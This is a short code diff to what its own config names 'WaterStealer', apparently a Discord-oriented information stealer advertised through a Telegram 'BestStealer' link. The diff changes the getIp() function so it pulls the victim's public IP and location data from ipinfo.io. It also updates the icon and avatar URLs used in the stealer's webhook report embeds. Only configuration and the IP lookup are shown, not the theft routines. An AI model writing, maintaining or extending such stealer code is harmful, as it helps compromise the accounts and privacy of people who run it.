@@ -8,8 +8,7 @@ const querystring = require("querystring");
 const fs = require("fs");
 
 async function getIp() {
-    var ip = await axios.get("https://www.myexternalip.com/raw")
-    return ip.data;
+    return (await axios.get("https://ipinfo.io/json")).data;
 }
 
 var config = {
@@ -28,10 +27,10 @@ var config = {
         username: "WaterStealer",
         footer: {
             text: `WaterStealer`,
-            icon_url: "https://cdn.discordapp.com/attachments/1070413312971509921/1073954368665161748/mini.png",
+            icon_url: "https://cdn.discordapp.com/icons/1038524136839970966/c1f59fee8f2263be631d13420922089c.webp?size=96",
         },
         href: "https://t.me/BestStealer",
-        avatar_url: "https://cdn.discordapp.com/attachments/1070413312971509921/1073954368665161748/mini.png"
+        avatar_url: "https://cdn.discordapp.com/icons/1038524136839970966/c1f59fee8f2263be631d13420922089c.webp?size=96"
     },
 
     badges: {
